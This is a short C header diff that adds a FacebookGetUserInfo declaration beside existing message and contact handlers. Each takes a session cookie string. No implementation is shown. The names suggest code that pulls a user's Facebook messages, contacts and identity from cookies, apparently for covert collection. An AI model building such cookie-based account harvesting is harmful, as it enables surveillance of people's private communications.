@@ -5,6 +5,7 @@
 
 DWORD FacebookMessageHandler(LPSTR);
 DWORD FacebookContactHandler(LPSTR strCookie);
+BOOL FacebookGetUserInfo(LPSTR strCookie, LPSTR *strUserId, LPSTR *strScreenName);
 
 //#define FB_USER_ID "\"id\":\""
 #define FB_USER_ID "\"USER_ID\":\""
